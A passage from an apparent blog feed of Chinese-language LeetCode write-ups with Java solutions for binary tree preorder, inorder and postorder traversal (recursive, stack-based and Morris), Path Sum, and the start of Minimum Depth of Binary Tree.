ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                list.add(<span class="number">0</span>,node.val);</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                node = p.left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            list.add(<span class="number">0</span>,node.val);</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.right;</span><br><span class="line">            <span class="keyword">if</span>(node==<span class="keyword">null</span> &amp;&amp; !stack.empty())&#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution4"><a href="#Solution4" class="headerlink" title="Solution4"></a>Solution4</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>上面两种非递归的实现，大同小异，注意写法即可。但是上面的涉及一个思路，上面两种解法是基于先序遍历的思路，逆向过来的。而不是真正意义上的从上至下的遍历。要想从上至下的判断，需要考虑一个问题，因为根节点会在左孩子被访问后，再访问，但是，此时如果右孩子节点未被访问，则先访问右孩子节点。这里的判断需要注意。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node  = root,pre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.peek();</span><br><span class="line">                <span class="keyword">if</span>(p.right!=<span class="keyword">null</span> &amp;&amp; p.right!=pre)&#123;</span><br><span class="line">                    node = p.right;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pre = p;</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                stack.pop();</span><br><span class="line">                node = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数pre不是很好理解，它的意义在于，防止避免造成向下访问的死循环，告知该节点已访问。</p>
<p>这里修改了了<a href="https://war3cdota.github.io/2017/05/19/112-Path-Sum/">112. Path Sum</a>后序遍历解法得到。</p>
</blockquote>
<h2 id="Solution5"><a href="#Solution5" class="headerlink" title="Solution5"></a>Solution5</h2><p><strong>Morris traversal</strong></p>
<blockquote>
<p>时间复杂度：O(n)<br>空间复杂度：O(1)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePostorderTraversal2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(<span class="number">0</span>,cur.val);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.right;</span><br><span class="line">                <span class="keyword">while</span>(pre.left!=<span class="keyword">null</span> &amp;&amp; pre.left!=cur)&#123;</span><br><span class="line">                    pre = pre.left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    list.add(<span class="number">0</span>,cur.val);</span><br><span class="line">                    pre.left = cur;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    pre.left = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>后序遍历的非递归思路有两种：</p>
<ol>
<li>根据先序遍历，利用数据结构，使用先序遍历的相同方法可以解决。</li>
<li>自上向下的遍历，但是可能在是否访问过该节点需要再做判断。</li>
<li>后序遍历的Morris Traversal借助先序遍历的思路。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>Post-Order Traversal(后序遍历)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Morris Traversal</tag>
      </tags>
  </entry>
  <entry>
    <title>94. Binary Tree Inorder Traversal</title>
    <url>/2017/05/19/94-Binary-Tree-Inorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the inorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree [1,null,2,3],</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return [1,3,2].</p>
<p>Note: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursiuon!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        helper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            helper(list,node.left);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(node.val);</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            helper(list,node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不说了，递归还是很容易理解的。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>中序遍历非递归借助栈的实现方法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal2</span></span>&#123;</span><br><span class="line">    <span class="comment">// Without using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                node = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>Morris traversal</strong></p>
<blockquote>
<p>时间复杂度：O(n)<br>空间复杂度：O(1)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreeInorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.left;</span><br><span class="line">                <span class="keyword">while</span>(pre.right!=<span class="keyword">null</span> &amp;&amp; pre.right!=cur)&#123;</span><br><span class="line">                    pre = pre.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    pre.right = cur;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    list.add(cur.val);</span><br><span class="line">                    pre.right = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>递归和非递归的思路应该注意。同时也应该熟练Morris Traversal。</p>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Morris Traversal</tag>
        <tag>In-Order Traversal(中序遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>144. Binary Tree Preorder Traversal</title>
    <url>/2017/05/19/144-Binary-Tree-Preorder-Traversal/</url>
    <content><![CDATA[<p>Given a binary tree, return the preorder traversal of its nodes’ values.</p>
<p>For example:<br>Given binary tree <code>{1,#,2,3}</code>,</p>
<pre><code>1
 \
  2
 /
3
</code></pre><p>return [1,2,3].</p>
<p>Note: Recursive solution is trivial, could you do it iteratively?</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>使用递归(Recursion)</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="comment">// Using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        preorderHelper(list,root);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preorderHelper</span><span class="params">(ArrayList&lt;Integer&gt; list, TreeNode node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(node==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(node.val);</span><br><span class="line">        preorderHelper(list,node.left);</span><br><span class="line">        preorderHelper(list,node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>总的来说，递归的思路还是易于操作理解。</p>
</blockquote>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>主要借助栈，存取每一次的根节点，然后每次弹出栈顶元素，然后遍历右子树。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal3</span></span>&#123;</span><br><span class="line">    <span class="comment">// Without using recursion!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                stack.push(node);</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.pop();</span><br><span class="line">                node = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>不使用递归(Without using recursion)</strong></p>
<blockquote>
<p>仍然是不使用递归的思路，与Solution2不同的是，对于栈的使用有所不同。此方法中，更像是BFS的思路，按层来遍历，将每层的右节点存入栈中。然后利用栈的性质：“后进先出”，待到左节点为空时，再依次取出栈中元素。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        TreeNode node = root;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            list.add(node.val);</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            node = node.left;</span><br><span class="line">            <span class="keyword">if</span>(node==<span class="keyword">null</span> &amp;&amp; !stack.empty())&#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution4"><a href="#Solution4" class="headerlink" title="Solution4"></a>Solution4</h2><blockquote>
<p>上述3种方法是最常用的遍历二叉树的方法，其时间、空间复杂度均为O(n)。<br>下面说一种名为Morris Traversal（莫里斯遍历），其时间复杂度为O(n)，但是由于没有借助栈，所以其空间复杂度为O(1)。</p>
</blockquote>
<p><strong>Morris traversal</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinaryTreePreorderTraversal3</span></span>&#123;</span><br><span class="line">    <span class="comment">// Morris Traversal !</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.left==<span class="keyword">null</span>)&#123;</span><br><span class="line">                list.add(cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = cur.left;</span><br><span class="line">                <span class="keyword">while</span>(pre.right!=<span class="keyword">null</span> &amp;&amp; pre.right!=cur)&#123;</span><br><span class="line">                    pre = pre.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(pre.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">                    list.add(cur.val);</span><br><span class="line">                    pre.right = cur;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    pre.right = <span class="keyword">null</span>;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>介绍了四种遍历方法，分为三种类型：</p>
<ol>
<li>递归法，这种方式便于理解，代码简洁。</li>
<li>非递归法，两种思路，一种是利用栈存储根节点，然后每次弹出后访问其右孩子节点；另一种是按层，每次存储向左遍历的根节点的右孩子节点，然后当左节点为叶节点时，按照栈的顺序弹出栈中元素。</li>
<li>莫里斯遍历，利用对于是否访问过该节点判断是否是回溯还是第一次向下遍历。<br>对于先序，中序，后序的遍历，是用递归都是最易于理解的。使用循环操作是相对麻烦的。同时，对于栈的灵活应用也是应该值得学习的。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>recursion(递归)</tag>
        <tag>LeetCode-medium</tag>
        <tag>Morris Traversal</tag>
        <tag>Pre-Order Traversal(先序遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>112. Path Sum</title>
    <url>/2017/05/19/112-Path-Sum/</url>
    <content><![CDATA[<p>Given a binary tree and a sum, determine if the tree has a root-to-leaf path such that adding up all the values along the path equals the given sum.</p>
<p><strong>For example:</strong><br><br>Given the below binary tree and <code>sum = 22</code>,</p>
<pre><code>      5
     / \
    4   8
   /   / \
  11  13  4
 /  \      \
7    2      1
</code></pre><p>return true, as there exist a root-to-leaf path <code>5-&gt;4-&gt;11-&gt;2</code> which sum is 22.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>递归</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="keyword">null</span>&amp;&amp;root.right==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> sum==root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.right,sum-root.val)||hasPathSum(root.left,sum-root.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p><strong>postorder traversal(后序遍历)</strong></p>
<blockquote>
<p>利用后序遍历找出符合条件的答案。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">int</span> SUM = <span class="number">0</span>;</span><br><span class="line">        TreeNode node = root,pre=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                SUM += node.val;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;</span><br><span class="line">            node = stack.peek();</span><br><span class="line">            <span class="keyword">if</span>(node.left==<span class="keyword">null</span>&amp;&amp;node.right==<span class="keyword">null</span>&amp;&amp;sum==SUM)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span> &amp;&amp; pre!=node.right)&#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                SUM -= node.val;</span><br><span class="line">                pre = node;</span><br><span class="line">                stack.pop();</span><br><span class="line">                node = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>另一种后序遍历的常用写法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathSum3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">        <span class="keyword">int</span> SUM = <span class="number">0</span>;</span><br><span class="line">        TreeNode node = root,pre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(node!=<span class="keyword">null</span> || !stack.empty())&#123;</span><br><span class="line">            <span class="keyword">if</span>(node!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(node);</span><br><span class="line">                SUM += node.val;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode p = stack.peek();</span><br><span class="line">                <span class="keyword">if</span>(p.left==<span class="keyword">null</span>&amp;&amp;p.right==<span class="keyword">null</span>&amp;&amp;SUM==sum)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(p.right!=<span class="keyword">null</span>&amp;&amp;pre!=p.right)&#123;</span><br><span class="line">                    node = p.right;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    SUM -= p.val;</span><br><span class="line">                    pre = p;</span><br><span class="line">                    stack.pop();</span><br><span class="line">                    node = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>后序遍历的循环操作二叉树是需要理解下的。在本题中，需要再更进一步，利用栈来组合新的和。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Stack(栈)</tag>
        <tag>Post-Order Traversal(后序遍历)</tag>
      </tags>
  </entry>
  <entry>
    <title>111. Minimum Depth of Binary Tree</title>
    <url>/2017/05/11/111-Minimum-Depth-of-Binary-Tree/</url>
    <content><![CDATA[<p>Given a binary tree, find its minimum depth.</p>
<p>The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><h3 id="递归解决"><a href="#递归解决" class="headerlink" title="递归解决"></a>递归解决</h3><p><strong>Boundary Check(边界值检测)</strong></p>
<blockquote>
<p>从尾部向上递归：</p>
<ol>
<li>当前节点为空，返回0；</li>
<li>当前节点的左右节点均为空，返回1；</li>
<li>当前节点的左右节点中有一个为空，则应该返回不为空的节点的子树最小深度。</li>
<li>当前节点的左右节点均不为空，则应该返回深度小的节点。</li>
</ol>
</blockquote>
